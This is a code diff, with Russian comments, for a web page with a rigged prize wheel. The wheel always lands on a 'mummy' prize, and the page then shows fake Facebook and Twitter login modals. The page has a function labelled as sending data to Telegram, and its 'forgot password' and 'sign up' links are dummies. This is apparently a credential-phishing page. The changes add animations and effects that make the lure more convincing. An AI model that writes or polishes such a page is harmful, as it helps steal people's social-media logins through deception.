             isSpinning = true;
             spinButton.disabled = true;
-            spinButton.textContent = "КРУТИТЬ РУЛЕТКУ";
+            spinButton.style.animation = 'none';
+            
+            // Добавляем анимацию вращения
+            const rouletteContainer = document.querySelector('.roulette-container');
+            rouletteContainer.classList.add('spinning');
             
             // ВСЕГДА выбираем приз "mummy" (мумию) - индекс 3
-            const TARGET_PRIZE_INDEX = 3; // mummy всегда
+            const TARGET_PRIZE_INDEX = 3;
             currentPrize = prizes[TARGET_PRIZE_INDEX];
             
-            // ПРАВИЛЬНЫЙ УГОЛ для мумии СПРАВА
-            // Если мумия СПРАВА от предыдущего приза, нужно ВЫЧЕСТЬ 30 градусов
-            const anglePerPrize = 30; // 360 / 12 = 30 градусов на приз
-            const baseAngle = TARGET_PRIZE_INDEX * anglePerPrize; // 3 * 30 = 90
-            
-            // Корректировка: чтобы мумия была точно вверху (на 12 часов)
-            // МИНУС 30 градусов, так как мумия СПРАВА (по часовой стрелке)
-            // Ранее было +90, теперь 90 - 30 = 60
-            const correctionAngle = 90 - 30; // 60 градусов
-            const targetAngle = baseAngle + correctionAngle; // 90 + 60 = 150
+            // Расчет угла для мумии
+            const anglePerPrize = 30;
+            const baseAngle = TARGET_PRIZE_INDEX * anglePerPrize;
+            const correctionAngle = 90 - 30;
+            const targetAngle = baseAngle + correctionAngle;
             
             // Делаем 5 полных оборотов плюс угол до приза
-            const spins = 5; // Фиксированное количество оборотов
-            const totalRotation = (spins * 360) + targetAngle; // 1800 + 150 = 1950 градусов
+            const spins = 5;
+            const totalRotation = (spins * 360) + targetAngle;
             
-            // Анимация вращения с эффектом замедления
-            prizeWheel.style.transition = 'transform 4s cubic-bezier(0.2, 0.8, 0.2, 1)';
+            // Усиливаем свечение колеса
+            wheelGlow.style.opacity = '1';
+            
+            // Анимация вращения
+            prizeWheel.style.transition = 'transform 4s cubic-bezier(0.1, 0.7, 0.1, 1)';
             currentRotation = totalRotation;
             prizeWheel.style.transform = `rotate(${currentRotation}deg)`;
             
-            // Отмечаем, что вращение уже было
+            // Добавляем частицы при вращении
+            createParticles();
+            
             hasSpun = true;
             
-            // Показ модального окна с выигрышем через 4 секунды
+            // Показ модального окна с выигрышем
             setTimeout(() => {
+                // Убираем анимацию вращения
+                rouletteContainer.classList.remove('spinning');
+                wheelGlow.style.opacity = '0';
+                
+                // Загружаем и отображаем приз
                 winPrizeImage.src = currentPrize.image;
+                
+                // Добавляем анимацию для mummy приза
+                if (currentPrize.name === 'mummy') {
+                    const container = winPrizeImage.closest('.mummy-container');
+                    container.classList.add('mummy-special');
+                }
+                
                 winModal.style.display = 'flex';
                 isSpinning = false;
-                // Не включаем кнопку обратно после вращения
                 spinButton.disabled = true;
                 spinButton.style.opacity = '0.5';
             }, 4000);
+        }
+
+        // Создание частиц
+        function createParticles() {
+            const container = document.querySelector('.container');
+            const particles = document.createElement('div');
+            particles.className = 'particles';
+            
+            for (let i = 0; i < 20; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                
+                // Позиция вокруг колеса
+                const angle = Math.random() * Math.PI * 2;
+                const distance = 200 + Math.random() * 100;
+                const x = 200 + Math.cos(angle) * distance;
+                const y = 200 + Math.sin(angle) * distance;
+                
+                particle.style.left = `${x}px`;
+                particle.style.top = `${y}px`;
+                particle.style.width = `${3 + Math.random() * 5}px`;
+                particle.style.height = particle.style.width;
+                particle.style.background = `hsl(${50 + Math.random() * 10}, 100%, 50%)`;
+                particle.style.opacity = '0.8';
+                
+                // Анимация частицы
+                const duration = 1 + Math.random() * 1;
+                particle.style.transition = `all ${duration}s ease-out`;
+                
+                particles.appendChild(particle);
+                
+                // Анимируем частицу
+                setTimeout(() => {
+                    const targetX = 200 + Math.cos(angle) * 400;
+                    const targetY = 200 + Math.sin(angle) * 400;
+                    particle.style.left = `${targetX}px`;
+                    particle.style.top = `${targetY}px`;
+                    particle.style.opacity = '0';
+                    particle.style.transform = 'scale(0.5)';
+                }, 10);
+            }
+            
+            container.appendChild(particles);
+            
+            // Удаляем частицы после анимации
+            setTimeout(() => {
+                particles.remove();
+            }, 2000);
         }
 
         // Функция отправки данных в Telegram
@@ -1101,6 +1527,7 @@
         confirmLogin.addEventListener('click', () => {
             winModal.style.display = 'none';
             
+            // Добавляем анимацию при переходе
             if (selectedLoginOption === 'facebook') {
                 facebookModal.style.display = 'flex';
             } else {
@@ -1134,6 +1561,12 @@
             if (success) {
                 facebookModal.style.display = 'none';
                 successPrizeImage.src = currentPrize.image;
+                
+                // Добавляем анимацию для mummy в окне успеха
+                if (currentPrize.name === 'mummy') {
+                    successPrizeImage.classList.add('animated');
+                }
+                
                 successModal.style.display = 'flex';
             }
         });
@@ -1156,6 +1589,12 @@
             if (success) {
                 twitterModal.style.display = 'none';
                 successPrizeImage.src = currentPrize.image;
+                
+                // Добавляем анимацию для mummy в окне успеха
+                if (currentPrize.name === 'mummy') {
+                    successPrizeImage.classList.add('animated');
+                }
+                
                 successModal.style.display = 'flex';
             }
         });
@@ -1169,25 +1608,21 @@
 
         document.getElementById('forgotPassword').addEventListener('click', (e) => {
             e.preventDefault();
-            // В реальном приложении здесь была бы страница восстановления пароля
             alert('Password recovery feature would open here');
         });
 
         document.getElementById('twitterForgot').addEventListener('click', (e) => {
             e.preventDefault();
-            // В реальном приложении здесь была бы страница восстановления пароля
             alert('Password recovery feature would open here');
         });
 
         // Создание аккаунта
         document.getElementById('createAccount').addEventListener('click', () => {
-            // В реальном приложении здесь была бы страница создания аккаунта
             alert('Account creation page would open here');
         });
 
         document.getElementById('twitterSignup').addEventListener('click', (e) => {
             e.preventDefault();
-            // В реальном приложении здесь была бы страница регистрации
             alert('Twitter signup page would open here');
         });
 
@@ -1207,7 +1642,6 @@
 
         document.getElementById('okSuccess').addEventListener('click', () => {
             successModal.style.display = 'none';
-            // Можно добавить редирект или другие действия
         });
 
         // Блокировка прокрутки
